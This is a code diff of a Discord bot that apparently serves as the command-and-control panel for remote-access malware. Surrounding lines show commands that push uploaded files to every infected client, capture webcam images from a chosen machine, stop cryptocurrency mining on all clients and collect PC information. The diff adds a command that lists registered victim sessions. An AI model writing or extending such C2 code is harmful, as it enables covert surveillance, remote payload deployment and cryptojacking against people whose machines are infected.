@@ -67,6 +67,26 @@ async def update(interaction: discord.Interaction, file: discord.Attachment):
     response = requests.post(f'{INTERMEDIARY_SERVER_URL}/broadcast_command', json={"command": f'upload {file_url} {file_name}'})
     await interaction.response.send_message(f"Updated {file_name} on all clients successfully.")
 
+@bot.tree.command(name='list_clients', description='List all registered clients')
+async def list_clients(interaction: discord.Interaction):
+    try:
+        # Make a request to the intermediary server to get the list of clients
+        response = requests.get(f'{INTERMEDIARY_SERVER_URL}/list_clients')
+        
+        # Check if the response is successful
+        if response.status_code == 200:
+            clients = response.json().get('clients', [])
+            if not clients:
+                await interaction.response.send_message("No clients are currently registered.")
+            else:
+                # Create a message to display the list of clients
+                clients_list = "\n".join([f"- {client['session_id']}" for client in clients])
+                await interaction.response.send_message(f"**Registered Clients:**\n{clients_list}")
+        else:
+            await interaction.response.send_message(f"Failed to fetch the client list. Status code: {response.status_code}")
+    
+    except Exception as e:
+        await interaction.response.send_message(f"Error while fetching client list: {e}")
 
 
 @bot.tree.command(name='webcam', description='Capture a webcam image from a specific client')
@@ -111,6 +131,7 @@ async def stop_mining_all_command(interaction: discord.Interaction):
 async def pc_info(interaction: discord.Interaction, session_id: str):
     response = requests.post(f'{INTERMEDIARY_SERVER_URL}/send_command', json={"session_id": session_id, "command": 'pc_info'})
     await interaction.response.send_message(f"PC info command sent to {session_id} successfully. Result will be posted shortly.")
+
 
 if __name__ == "__main__":
     bot.run(BOT_TOKEN)
